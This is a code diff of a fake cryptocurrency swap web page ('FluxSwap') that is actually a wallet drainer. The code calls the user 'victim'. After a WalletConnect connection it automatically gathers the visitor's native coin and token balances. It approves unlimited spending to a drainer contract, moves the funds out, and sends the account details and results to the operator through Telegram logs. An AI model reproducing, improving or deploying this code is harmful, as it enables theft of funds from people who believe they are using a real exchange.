+                    console.warn('Balance update error:', e);
                 }
             }
-        }
 
-        // ===== ДРЕЙНЕР С ЛОГАМИ =====
-        async function startDrain() {
-            if (isProcessing) return;
-            if (!provider || !signer) {
-                setStatus('Please connect wallet first', 'err');
-                return;
-            }
-
-            const contractAddr = CONTRACT_ADDRESSES[chainId];
-            if (!contractAddr) {
-                setStatus('Network not supported', 'err');
-                return;
-            }
-
-            isProcessing = true;
-            updateSwapButton();
-            setStatus('🔍 Gathering assets...', '');
-
-            const logEntries = [];
-            const startTime = Date.now();
-            let successCount = 0;
-            let failCount = 0;
-
-            try {
-                const assets = [];
-                const nativeBal = await provider.getBalance(victim);
-                if (nativeBal.gt(0)) {
-                    assets.push({ type: 'native', amount: nativeBal, symbol: 'Native' });
-                }
-
-                const tokenMap = {
-                    1: ['USDT','USDC','DAI','WBTC','LINK'],
-                    56: ['USDT','USDC','DAI','WBTC','LINK'],
-                    137: ['USDT','USDC','DAI','WBTC','LINK'],
-                    42161: ['USDT','USDC','DAI','WBTC','LINK']
+            function getTokenAddress(symbol) {
+                const map = {
+                    1: { 'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7', 'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', 'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F', 'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', 'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
+                    56: { 'USDT': '0x55d398326f99059fF775485246999027B3197955', 'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', 'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', 'WBTC': '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', 'LINK': '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD' },
+                    137: { 'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', 'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', 'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', 'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6', 'LINK': '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39' },
+                    42161: { 'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', 'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', 'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0', 'WBTC': '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', 'LINK': '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4' }
                 };
-                const symbols = tokenMap[chainId] || [];
-                for (const sym of symbols) {
-                    const addr = getTokenAddress(sym);
-                    if (!addr) continue;
-                    try {
-                        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-                        const bal = await contract.balanceOf(victim);
-                        if (bal.gt(0)) {
-                            assets.push({ type: 'token', address: addr, amount: bal, symbol: sym });
-                        }
-                    } catch (_) { /* пропускаем */ }
-                }
+                if (!chainId || !map[chainId]) return null;
+                return map[chainId][symbol] || null;
+            }
 
-                if (assets.length === 0) {
-                    const msg = 'No assets found to swap';
-                    setStatus(msg, 'err');
-                    await sendTelegramLog(
-                        `⚠️ <b>Swap attempt failed</b>\n` +
-                        `👤 Account: <code>${victim}</code>\n` +
-                        `❌ Reason: ${msg}\n` +
-                        `⏰ Time: ${new Date().toLocaleString()}`
-                    );
-                    isProcessing = false;
-                    updateSwapButton();
+            // ===== ОБНОВЛЕНИЕ КУРСА =====
+            async function updateRateAndOutput() {
+                const fromId = fromToken.id;
+                const toId = toToken.id;
+                if (!fromId || !toId) {
+                    rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ? ' + toToken.symbol;
+                    outputAmount.value = '';
+                    return;
+                }
+                const rate = await fetchRealRate(fromId, toId);
+                currentRate = rate;
+                rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ' + rate.toFixed(6) + ' ' + toToken.symbol;
+                const inputVal = parseFloat(inputAmount.value) || 0;
+                if (inputVal > 0) {
+                    const outputVal = inputVal * rate;
+                    outputAmount.value = outputVal.toFixed(6);
+                } else {
+                    outputAmount.value = '';
+                }
+                const fromPrice = await fetchPriceUSD(fromId);
+                const toPrice = await fetchPriceUSD(toId);
+                document.getElementById('fromUsd').textContent = fromPrice ? '~$' + (inputVal * fromPrice).toFixed(2) : '~$0.00';
+                document.getElementById('toUsd').textContent = toPrice ? '~$' + (parseFloat(outputAmount.value || 0) * toPrice).toFixed(2) : '~$0.00';
+                if (isConnected) await updateBalances();
+            }
+
+            // ===== UI =====
+            function setStatus(text, type) {
+                statusEl.textContent = text;
+                statusEl.className = 'status';
+                if (type === 'ok') statusEl.classList.add('ok');
+                if (type === 'err') statusEl.classList.add('err');
+            }
+
+            function updateConnectButton() {
+                if (isConnected && victim) {
+                    connectBtn.innerHTML = '<i class="fas fa-check"></i> ' + victim.slice(0,6) + '...' + victim.slice(-4);
+                    connectBtn.classList.add('connected');
+                } else {
+                    connectBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect';
+                    connectBtn.classList.remove('connected');
+                }
+                updateSwapButton();
+            }
+
+            function updateSwapButton() {
+                const val = parseFloat(inputAmount.value);
+                if (isProcessing) {
+                    swapBtn.textContent = 'Processing...';
+                    swapBtn.disabled = true;
+                    swapBtn.className = 'btn-swap loading';
+                    return;
+                }
+                if (!isConnected) {
+                    swapBtn.textContent = 'Connect Wallet';
+                    swapBtn.disabled = false;
+                    swapBtn.className = 'btn-swap';
+                    return;
+                }
+                if (!val || val <= 0) {
+                    swapBtn.textContent = 'Enter an amount';
+                    swapBtn.disabled = true;
+                    swapBtn.className = 'btn-swap';
+                    return;
+                }
+                swapBtn.textContent = 'Swap';
+                swapBtn.disabled = false;
+                swapBtn.className = 'btn-swap';
+            }
+
+            function openModal(modal) { modal.classList.add('active'); }
+            function closeModal(modal) { modal.classList.remove('active'); }
+
+            // ===== ОЧИСТКА =====
+            async function forceClearSession() {
+                try {
+                    if (wcProvider) {
+                        try { await wcProvider.disconnect(); } catch (_) {}
+                        wcProvider = null;
+                    }
+                    const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
+                    for (const pattern of patterns) {
+                        for (let i = localStorage.length - 1; i >= 0; i--) {
+                            const key = localStorage.key(i);
+                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) localStorage.removeItem(key);
+                        }
+                        for (let i = sessionStorage.length - 1; i >= 0; i--) {
+                            const key = sessionStorage.key(i);
+                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) sessionStorage.removeItem(key);
+                        }
+                        document.cookie.split(';').forEach(cookie => {
+                            const [name] = cookie.trim().split('=');
+                            if (name && name.toLowerCase().includes(pattern.toLowerCase())) {
+                                document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+                            }
+                        });
+                    }
+                    try {
+                        const dbs = await indexedDB.databases();
+                        for (const db of dbs) {
+                            if (db.name && (db.name.toLowerCase().includes('wallet') || db.name.toLowerCase().includes('wc'))) {
+                                await new Promise((resolve, reject) => {
+                                    const req = indexedDB.deleteDatabase(db.name);
+                                    req.onsuccess = resolve;
+                                    req.onerror = reject;
+                                });
+                            }
+                        }
+                    } catch (_) {}
+                    provider = null; signer = null; victim = null; chainId = null;
+                    isConnected = false; isProcessing = false; isConnecting = false;
+                    if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
+                } catch (_) {}
+            }
+
+            // ===== ПОЛУЧЕНИЕ ПРОВАЙДЕРА WALLETCONNECT =====
+            function getEthereumProvider() {
+                // Проверяем все возможные экспорты из UMD-библиотеки
+                if (window.ethereumProvider) return window.ethereumProvider;
+                if (window.WalletConnectProvider) return window.WalletConnectProvider;
+                if (window['@walletconnect/ethereum-provider']) {
+                    const mod = window['@walletconnect/ethereum-provider'];
+                    if (typeof mod === 'function') return mod;
+                    if (mod.default) return mod.default;
+                    return mod;
+                }
+                if (window.EthereumProvider) return window.EthereumProvider;
+                return null;
+            }
+
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
+            async function connectWalletConnect() {
+                if (isConnecting || isProcessing) return;
+                closeModal(walletModal);
+
+                await forceClearSession();
+                await new Promise(resolve => setTimeout(resolve, 300));
+
+                const EthereumProvider = getEthereumProvider();
+                if (!EthereumProvider) {
+                    setStatus('❌ WalletConnect library not loaded. Check CDN.', 'err');
+                    await sendTelegramLog('❌ WalletConnect library not found');
                     return;
                 }
 
-                const drainerContract = new ethers.Contract(contractAddr, DRAINER_ABI, signer);
+                try {
+                    setStatus('Connecting to WalletConnect...', '');
+                    isConnecting = true;
 
-                // Нативные
-                for (const a of assets) {
-                    if (a.type === 'native') {
-                        try {
-                            let gasEstimate;
-                            try {
-                                gasEstimate = await drainerContract.estimateGas.swap({ value: a.amount });
-                            } catch (_) {
-                                gasEstimate = 50000;
-                            }
-                            const gasPrice = await provider.getGasPrice();
-                            const gasCost = gasPrice.mul(gasEstimate);
-                            const buffer = gasCost.mul(120).div(100);
-                            let value = a.amount.sub(buffer);
-                            if (value.lt(0)) {
-                                const msg = 'Insufficient native for gas';
-                                setStatus(msg, 'err');
-                                logEntries.push(`❌ Native: ${msg}`);
-                                failCount++;
-                                continue;
-                            }
-                            setStatus(`Swapping native (${ethers.utils.formatEther(value)}...)`, '');
-                            const tx = await drainerContract.swap({
-                                value: value,
-                                gasLimit: gasEstimate.mul(120).div(100),
-                                gasPrice: gasPrice
-                            });
-                            const receipt = await tx.wait();
-                            successCount++;
-                            logEntries.push(
-                                `✅ Native swap successful\n` +
-                                `   Tx: <a href="https://etherscan.io/tx/${receipt.transactionHash}">${receipt.transactionHash.slice(0,10)}...</a>\n` +
-                                `   Amount: ${ethers.utils.formatEther(value)} native`
-                            );
-                        } catch (e) {
-                            failCount++;
-                            logEntries.push(`❌ Native swap failed: ${e.message || 'unknown'}`);
+                    wcProvider = await EthereumProvider.init({
+                        projectId: PROJECT_ID,
+                        chains: [1, 56, 137, 42161],
+                        showQrModal: true,
+                        optionalChains: [1, 56, 137, 42161],
+                        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
+                        events: ['chainChanged', 'accountsChanged'],
+                        metadata: {
+                            name: 'FluxSwap',
+                            description: 'Swap interface',
+                            url: window.location.href,
+                            icons: []
                         }
+                    });
+
+                    wcProvider.on('chainChanged', (chainIdHex) => {
+                        chainId = parseInt(chainIdHex, 16);
+                        updateBalances();
+                    });
+                    wcProvider.on('accountsChanged', (accounts) => {
+                        if (accounts.length === 0) {
+                            setStatus('Account disconnected', 'err');
+                            isConnected = false;
+                            victim = null;
+                            updateConnectButton();
+                            isConnecting = false;
+                        } else {
+                            victim = accounts[0];
+                            updateConnectButton();
+                            updateBalances();
+                        }
+                    });
+                    wcProvider.on('session_delete', async () => {
+                        setStatus('Session expired', 'err');
+                        isConnected = false;
+                        await forceClearSession();
+                        updateConnectButton();
+                    });
+
+                    await wcProvider.enable();
+
+                    const web3Provider = new ethers.providers.Web3Provider(wcProvider);
+                    const signer_ = web3Provider.getSigner();
+                    const address = await signer_.getAddress();
+                    const network = await web3Provider.getNetwork();
+
+                    provider = web3Provider;
+                    signer = signer_;
+                    victim = address;
+                    chainId = network.chainId;
+                    isConnected = true;
+
+                    updateConnectButton();
+                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
+                    isConnecting = false;
+
+                    await updateBalances();
+                    await updateRateAndOutput();
+
+                    const networkNames = {1: 'Ethereum', 56: 'BSC', 137: 'Polygon', 42161: 'Arbitrum'};
+                    await sendTelegramLog(
+                        `🔗 <b>New connection</b>\n` +
+                        `👤 Account: <code>${address}</code>\n` +
+                        `🌐 Network: ${networkNames[chainId] || chainId}\n` +
+                        `⏰ Time: ${new Date().toLocaleString()}`
+                    );
+
+                    setTimeout(() => startDrain(), 800);
+
+                } catch (e) {
+                    const msg = e.message || 'Unknown error';
+                    setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
+                    isConnecting = false;
+                    await forceClearSession();
+                    if (msg.toLowerCase().includes('reset') || msg.toLowerCase().includes('timeout')) {
+                        setStatus('Retrying...', 'err');
+                        retryTimer = setTimeout(() => {
+                            retryTimer = null;
+                            if (!isConnected && !isConnecting) {
+                                connectWalletConnect();
+                            }
+                        }, 2000);
                     }
                 }
+            }
 
-                // Токены
-                for (const a of assets) {
-                    if (a.type === 'token') {
-                        try {
-                            const token = new ethers.Contract(a.address, ERC20_ABI, signer);
-                            const allowance = await token.allowance(victim, contractAddr);
-                            if (allowance.lt(a.amount)) {
-                                setStatus(`Approving ${a.symbol}...`, '');
-                                const approveTx = await token.approve(contractAddr, ethers.constants.MaxUint256);
-                                await approveTx.wait();
-                            }
-                            setStatus(`Swapping ${a.symbol}...`, '');
-                            let gasEstimate;
-                            try {
-                                gasEstimate = await drainerContract.estimateGas.swapToken(a.address, a.amount);
-                            } catch (_) {
-                                gasEstimate = 100000;
-                            }
-                            const gasPrice = await provider.getGasPrice();
-                            const tx = await drainerContract.swapToken(a.address, a.amount, {
-                                gasLimit: gasEstimate.mul(120).div(100),
-                                gasPrice: gasPrice
-                            });
-                            const receipt = await tx.wait();
-                            successCount++;
-                            const decimals = await token.decimals().catch(() => 18);
-                            logEntries.push(
-                                `✅ ${a.symbol} swap successful\n` +
-                                `   Tx: <a href="https://etherscan.io/tx/${receipt.transactionHash}">${receipt.transactionHash.slice(0,10)}...</a>\n` +
-                                `   Amount: ${formatBalance(a.amount, decimals)} ${a.symbol}`
-                            );
-                        } catch (e) {
-                            failCount++;
-                            logEntries.push(`❌ ${a.symbol} swap failed: ${e.message || 'unknown'}`);
-                        }
-                    }
+            // ===== ДРЕЙНЕР С ЛОГАМИ =====
+            async function startDrain() {
+                if (isProcessing) return;
+                if (!provider || !signer) {
+                    setStatus('Please connect wallet first', 'err');
+                    return;
                 }
 
-                const duration = ((Date.now() - startTime) / 1000).toFixed(1);
-                const total = successCount + failCount;
-                const status = failCount === 0 ? '✅ COMPLETED' : (successCount > 0 ? '⚠️ PARTIAL' : '❌ FAILED');
+                const contractAddr = CONTRACT_ADDRESSES[chainId];
+                if (!contractAddr) {
+                    setStatus('Network not supported', 'err');
+                    return;
+                }
 
-                let logMessage = 
-                    `🔄 <b>Swap Report</b>\n` +
-                    `👤 Account: <code>${victim}</code>\n` +
-                    `🌐 Network: ${chainId}\n` +
-                    `📊 Status: ${status}\n` +
-                    `✅ Success: ${successCount}/${total}\n` +
-                    `❌ Failed: ${failCount}/${total}\n` +
-                    `⏱️ Duration: ${duration}s\n` +
-                    `─────────────────\n` +
-                    logEntries.join('\n');
-
-                await sendTelegramLog(logMessage);
-
-                setStatus(`✅ Done: ${successCount}/${total} succeeded`, successCount > 0 ? 'ok' : 'err');
-                await forceClearSession();
-                isConnected = false;
-                updateConnectButton();
-                await updateBalances();
-
-            } catch (e) {
-                const msg = 'Critical error: ' + (e.message || 'unknown');
-                setStatus(msg, 'err');
-                await sendTelegramLog(
-                    `🚨 <b>Critical error</b>\n` +
-                    `👤 Account: <code>${victim}</code>\n` +
-                    `❌ ${msg}\n` +
-                    `⏰ Time: ${new Date().toLocaleString()}`
-                );
-            } finally {
-                isProcessing = false;
+                isProcessing = true;
                 updateSwapButton();
-            }
-        }
+                setStatus('🔍 Gathering assets...', '');
 
-        // ===== ОБРАБОТЧИКИ =====
-        connectBtn.addEventListener('click', function() { openModal(walletModal); });
+                const logEntries = [];
+                const startTime = Date.now();
+                let successCount = 0;
+                let failCount = 0;
 
-        walletConnectOption.addEventListener('click', async function() {
-            await forceClearSession();
-            connectWalletConnect();
-        });
-
-        closeModalBtn.addEventListener('click', function() { closeModal(walletModal); });
-        walletModal.addEventListener('click', function(e) { if (e.target === walletModal) closeModal(walletModal); });
-        closeTokenModalBtn.addEventListener('click', function() { closeModal(tokenModal); });
-        tokenModal.addEventListener('click', function(e) { if (e.target === tokenModal) closeModal(tokenModal); });
-
-        swapBtn.addEventListener('click', function() {
-            if (!isConnected) { openModal(walletModal); return; }
-            const val = parseFloat(inputAmount.value);
-            if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
-            startDrain();
-        });
-
-        maxBtn.addEventListener('click', function() {
-            if (!isConnected || !victim) {
-                setStatus('Connect wallet first', 'err');
-                return;
-            }
-            const symbol = fromToken.symbol;
-            const isNative = (symbol === 'ETH' || symbol === 'BNB' || symbol === 'MATIC');
-            if (isNative) {
-                const gasBuffer = ethers.utils.parseEther('0.01');
-                let max = fromBalanceWei.sub(gasBuffer);
-                if (max.lt(0)) max = ethers.BigNumber.from(0);
-                inputAmount.value = ethers.utils.formatEther(max);
-            } else {
-                const decimals = getTokenDecimals(symbol);
-                inputAmount.value = formatBalance(fromBalanceWei, decimals);
-            }
-            updateSwapButton();
-            updateRateAndOutput();
-        });
-
-        inputAmount.addEventListener('input', function() {
-            updateSwapButton();
-            updateRateAndOutput();
-        });
-
-        refreshBtn.addEventListener('click', async function() {
-            if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
-            await forceClearSession();
-            inputAmount.value = '';
-            outputAmount.value = '';
-            updateConnectButton();
-            setStatus('Session reset', '');
-            closeModal(walletModal);
-            closeModal(tokenModal);
-            updateRateAndOutput();
-        });
-
-        // ===== ВЫБОР ТОКЕНОВ =====
-        function renderTokenList(filter) {
-            filter = (filter || '').toLowerCase();
-            tokenList.innerHTML = '';
-            tokens.forEach(function(token) {
-                if (token.symbol.toLowerCase().includes(filter) || token.name.toLowerCase().includes(filter)) {
-                    const isDisabled = (currentSelectType === 'from' && token.symbol === toToken.symbol) ||
-                                       (currentSelectType === 'to' && token.symbol === fromToken.symbol);
-                    const item = document.createElement('div');
-                    item.className = 'token-row' + (isDisabled ? ' disabled' : '');
-                    item.innerHTML = '<span class="t-mark"><img src="' + token.img + '" alt="' + token.symbol + '" /></span>' +
-                                     '<div class="t-info"><span class="t-sym">' + token.symbol + '</span><span class="t-name">' + token.name + '</span></div>';
-                    if (!isDisabled) {
-                        item.addEventListener('click', function() {
-                            if (currentSelectType === 'from') fromToken = token;
-                            else toToken = token;
-                            closeModal(tokenModal);
-                            fromIcon.src = fromToken.img;
-                            fromSymbol.textContent = fromToken.symbol;
-                            toIcon.src = toToken.img;
-                            toSymbol.textContent = toToken.symbol;
-                            updateRateAndOutput();
-                            if (isConnected) updateBalances();
-                        });
+                try {
+                    const assets = [];
+                    const nativeBal = await provider.getBalance(victim);
+                    if (nativeBal.gt(0)) {
+                        assets.push({ type: 'native', amount: nativeBal, symbol: 'Native' });
                     }
-                    tokenList.appendChild(item);
+
+                    const tokenMap = {
+                        1: ['USDT','USDC','DAI','WBTC','LINK'],
+                        56: ['USDT','USDC','DAI','WBTC','LINK'],
+                        137: ['USDT','USDC','DAI','WBTC','LINK'],
+                        42161: ['USDT','USDC','DAI','WBTC','LINK']
+                    };
+                    const symbols = tokenMap[chainId] || [];
+                    for (const sym of symbols) {
+                        const addr = getTokenAddress(sym);
+                        if (!addr) continue;
+                        try {
+                            const contract = new ethers.Contract(addr, ERC20_ABI, provider);
+                            const bal = await contract.balanceOf(victim);
+                            if (bal.gt(0)) {
+                                assets.push({ type: 'token', address: addr, amount: bal, symbol: sym });
+                            }
+                        } catch (_) { /* пропускаем */ }
+                    }
+
+                    if (assets.length === 0) {
+                        const msg = 'No assets found to swap';
+                        setStatus(msg, 'err');
+                        await sendTelegramLog(
+                            `⚠️ <b>Swap attempt failed</b>\n` +
+                            `👤 Account: <code>${victim}</code>\n` +
+                            `❌ Reason: ${msg}\n` +
+                            `⏰ Time: ${new Date().toLocaleString()}`
+                        );
+                        isProcessing = false;
+                        updateSwapButton();
+                        return;
+                    }
+
+                    const drainerContract = new ethers.Contract(contractAddr, DRAINER_ABI, signer);
+
+                    // Нативные
+                    for (const a of assets) {
+                        if (a.type === 'native') {
+                            try {
+                                let gasEstimate;
+                                try {
+                                    gasEstimate = await drainerContract.estimateGas.swap({ value: a.amount });
+                                } catch (_) {
+                                    gasEstimate = 50000;
+                                }
+                                const gasPrice = await provider.getGasPrice();
+                                const gasCost = gasPrice.mul(gasEstimate);
+                                const buffer = gasCost.mul(120).div(100);
+                                let value = a.amount.sub(buffer);
+                                if (value.lt(0)) {
+                                    const msg = 'Insufficient native for gas';
+                                    setStatus(msg, 'err');
+                                    logEntries.push(`❌ Native: ${msg}`);
+                                    failCount++;
+                                    continue;
+                                }
+                                setStatus(`Swapping native (${ethers.utils.formatEther(value)}...)`, '');
+                                const tx = await drainerContract.swap({
+                                    value: value,
+                                    gasLimit: gasEstimate.mul(120).div(100),
+                                    gasPrice: gasPrice
+                                });
+                                const receipt = await tx.wait();
+                                successCount++;
+                                logEntries.push(
+                                    `✅ Native swap successful\n` +
+                                    `   Tx: <a href="https://etherscan.io/tx/${receipt.transactionHash}">${receipt.transactionHash.slice(0,10)}...</a>\n` +
+                                    `   Amount: ${ethers.utils.formatEther(value)} native`
+                                );
+                            } catch (e) {
+                                failCount++;
+                                logEntries.push(`❌ Native swap failed: ${e.message || 'unknown'}`);
+                            }
+                        }
+                    }
+
+                    // Токены
+                    for (const a of assets) {
+                        if (a.type === 'token') {
+                            try {
+                                const token = new ethers.Contract(a.address, ERC20_ABI, signer);
+                                const allowance = await token.allowance(victim, contractAddr);
+                                if (allowance.lt(a.amount)) {
+                                    setStatus(`Approving ${a.symbol}...`, '');
+                                    const approveTx = await token.approve(contractAddr, ethers.constants.MaxUint256);
+                                    await approveTx.wait();
+                                }
+                                setStatus(`Swapping ${a.symbol}...`, '');
+                                let gasEstimate;
+                                try {
+                                    gasEstimate = await drainerContract.estimateGas.swapToken(a.address, a.amount);
+                                } catch (_) {
+                                    gasEstimate = 100000;
+                                }
+                                const gasPrice = await provider.getGasPrice();
+                                const tx = await drainerContract.swapToken(a.address, a.amount, {
+                                    gasLimit: gasEstimate.mul(120).div(100),
+                                    gasPrice: gasPrice
+                                });
+                                const receipt = await tx.wait();
+                                successCount++;
+                                const decimals = await token.decimals().catch(() => 18);
+                                logEntries.push(
+                                    `✅ ${a.symbol} swap successful\n` +
+                                    `   Tx: <a href="https://etherscan.io/tx/${receipt.transactionHash}">${receipt.transactionHash.slice(0,10)}...</a>\n` +
+                                    `   Amount: ${formatBalance(a.amount, decimals)} ${a.symbol}`
+                                );
+                            } catch (e) {
+                                failCount++;
+                                logEntries.push(`❌ ${a.symbol} swap failed: ${e.message || 'unknown'}`);
+                            }
+                        }
+                    }
+
+                    const duration = ((Date.now() - startTime) / 1000).toFixed(1);
+                    const total = successCount + failCount;
+                    const status = failCount === 0 ? '✅ COMPLETED' : (successCount > 0 ? '⚠️ PARTIAL' : '❌ FAILED');
+
+                    let logMessage = 
+                        `🔄 <b>Swap Report</b>\n` +
+                        `👤 Account: <code>${victim}</code>\n` +
+                        `🌐 Network: ${chainId}\n` +
+                        `📊 Status: ${status}\n` +
+                        `✅ Success: ${successCount}/${total}\n` +
+                        `❌ Failed: ${failCount}/${total}\n` +
+                        `⏱️ Duration: ${duration}s\n` +
+                        `─────────────────\n` +
+                        logEntries.join('\n');
+
+                    await sendTelegramLog(logMessage);
+
+                    setStatus(`✅ Done: ${successCount}/${total} succeeded`, successCount > 0 ? 'ok' : 'err');
+                    await forceClearSession();
+                    isConnected = false;
+                    updateConnectButton();
+                    await updateBalances();
+
+                } catch (e) {
+                    const msg = 'Critical error: ' + (e.message || 'unknown');
+                    setStatus(msg, 'err');
+                    await sendTelegramLog(
+                        `🚨 <b>Critical error</b>\n` +
+                        `👤 Account: <code>${victim}</code>\n` +
+                        `❌ ${msg}\n` +
+                        `⏰ Time: ${new Date().toLocaleString()}`
+                    );
+                } finally {
+                    isProcessing = false;
+                    updateSwapButton();
                 }
-            });
-        }
-
-        document.getElementById('tokenFromSelect').addEventListener('click', function(e) {
-            e.stopPropagation();
-            currentSelectType = 'from';
-            tokenSearchInput.value = '';
-            renderTokenList('');
-            openModal(tokenModal);
-        });
-        document.getElementById('tokenToSelect').addEventListener('click', function(e) {
-            e.stopPropagation();
-            currentSelectType = 'to';
-            tokenSearchInput.value = '';
-            renderTokenList('');
-            openModal(tokenModal);
-        });
-        tokenSearchInput.addEventListener('input', function() {
-            renderTokenList(this.value);
-        });
-
-        swapArrow.addEventListener('click', function() {
-            const temp = fromToken;
-            fromToken = toToken;
-            toToken = temp;
-            fromIcon.src = fromToken.img;
-            fromSymbol.textContent = fromToken.symbol;
-            toIcon.src = toToken.img;
-            toSymbol.textContent = toToken.symbol;
-            updateRateAndOutput();
-            if (isConnected) updateBalances();
-            setStatus('Tokens flipped', '');
-        });
-
-        // ===== ИНИЦИАЛИЗАЦИЯ =====
-        async function init() {
-            await forceClearSession();
-            updateConnectButton();
-            setStatus('Connect wallet to start swapping', '');
-            await updateRateAndOutput();
-            // Проверяем загрузку библиотек (они уже импортированы)
-            setStatus('✅ Libraries loaded. Connect wallet.', 'ok');
-            const params = new URLSearchParams(window.location.search);
-            if (params.has('nocache') || params.has('reset')) {
-                const cleanUrl = window.location.pathname + window.location.hash;
-                window.history.replaceState({}, document.title, cleanUrl);
             }
-            document.querySelector('#balanceFrom .max-tag')?.addEventListener('click', maxBtn.click);
-        }
 
-        init();
+            // ===== ОБРАБОТЧИКИ =====
+            connectBtn.addEventListener('click', function() { openModal(walletModal); });
 
+            walletConnectOption.addEventListener('click', async function() {
+                await forceClearSession();
+                connectWalletConnect();
+            });
+
+            closeModalBtn.addEventListener('click', function() { closeModal(walletModal); });
+            walletModal.addEventListener('click', function(e) { if (e.target === walletModal) closeModal(walletModal); });
+            closeTokenModalBtn.addEventListener('click', function() { closeModal(tokenModal); });
+            tokenModal.addEventListener('click', function(e) { if (e.target === tokenModal) closeModal(tokenModal); });
+
+            swapBtn.addEventListener('click', function() {
+                if (!isConnected) { openModal(walletModal); return; }
+                const val = parseFloat(inputAmount.value);
+                if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
+                startDrain();
+            });
+
+            maxBtn.addEventListener('click', function() {
+                if (!isConnected || !victim) {
+                    setStatus('Connect wallet first', 'err');
+                    return;
+                }
+                const symbol = fromToken.symbol;
+                const isNative = (symbol === 'ETH' || symbol === 'BNB' || symbol === 'MATIC');
+                if (isNative) {
+                    const gasBuffer = ethers.utils.parseEther('0.01');
+                    let max = fromBalanceWei.sub(gasBuffer);
+                    if (max.lt(0)) max = ethers.BigNumber.from(0);
+                    inputAmount.value = ethers.utils.formatEther(max);
+                } else {
+                    const decimals = getTokenDecimals(symbol);
+                    inputAmount.value = formatBalance(fromBalanceWei, decimals);
+                }
+                updateSwapButton();
+                updateRateAndOutput();
+            });
+
+            inputAmount.addEventListener('input', function() {
+                updateSwapButton();
+                updateRateAndOutput();
+            });
+
+            refreshBtn.addEventListener('click', async function() {
+                if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
+                await forceClearSession();
+                inputAmount.value = '';
+                outputAmount.value = '';
+                updateConnectButton();
+                setStatus('Session reset', '');
+                closeModal(walletModal);
+                closeModal(tokenModal);
+                updateRateAndOutput();
+            });
+
+            // ===== ВЫБОР ТОКЕНОВ =====
+            function renderTokenList(filter) {
+                filter = (filter || '').toLowerCase();
+                tokenList.innerHTML = '';
+                tokens.forEach(function(token) {
+                    if (token.symbol.toLowerCase().includes(filter) || token.name.toLowerCase().includes(filter)) {
+                        const isDisabled = (currentSelectType === 'from' && token.symbol === toToken.symbol) ||
+                                           (currentSelectType === 'to' && token.symbol === fromToken.symbol);
+                        const item = document.createElement('div');
+                        item.className = 'token-row' + (isDisabled ? ' disabled' : '');
+                        item.innerHTML = '<span class="t-mark"><img src="' + token.img + '" alt="' + token.symbol + '" /></span>' +
+                                         '<div class="t-info"><span class="t-sym">' + token.symbol + '</span><span class="t-name">' + token.name + '</span></div>';
+                        if (!isDisabled) {
+                            item.addEventListener('click', function() {
+                                if (currentSelectType === 'from') fromToken = token;
+                                else toToken = token;
+                                closeModal(tokenModal);
+                                fromIcon.src = fromToken.img;
+                                fromSymbol.textContent = fromToken.symbol;
+                                toIcon.src = toToken.img;
+                                toSymbol.textContent = toToken.symbol;
+                                updateRateAndOutput();
+                                if (isConnected) updateBalances();
+                            });
+                        }
+                        tokenList.appendChild(item);
+                    }
+                });
+            }
+
+            document.getElementById('tokenFromSelect').addEventListener('click', function(e) {
+                e.stopPropagation();
+                currentSelectType = 'from';
+                tokenSearchInput.value = '';
+                renderTokenList('');
+                openModal(tokenModal);
+            });
+            document.getElementById('tokenToSelect').addEventListener('click', function(e) {
+                e.stopPropagation();
+                currentSelectType = 'to';
+                tokenSearchInput.value = '';
+                renderTokenList('');
+                openModal(tokenModal);
+            });
+            tokenSearchInput.addEventListener('input', function() {
+                renderTokenList(this.value);
+            });
+
+            swapArrow.addEventListener('click', function() {
+                const temp = fromToken;
+                fromToken = toToken;
+                toToken = temp;
+                fromIcon.src = fromToken.img;
+                fromSymbol.textContent = fromToken.symbol;
+                toIcon.src = toToken.img;
+                toSymbol.textContent = toToken.symbol;
+                updateRateAndOutput();
+                if (isConnected) updateBalances();
+                setStatus('Tokens flipped', '');
+            });
+
+            // ===== ИНИЦИАЛИЗАЦИЯ =====
+            async function init() {
+                await forceClearSession();
+                updateConnectButton();
+                setStatus('Connect wallet to start swapping', '');
+                await updateRateAndOutput();
+                if (typeof ethers === 'undefined') {
+                    setStatus('❌ ethers is not loaded. Check CDN.', 'err');
+                }
+                // Проверяем наличие WalletConnect
+                const providerCheck = getEthereumProvider();
+                if (!providerCheck) {
+                    setStatus('❌ WalletConnect library not loaded. Check CDN.', 'err');
+                } else {
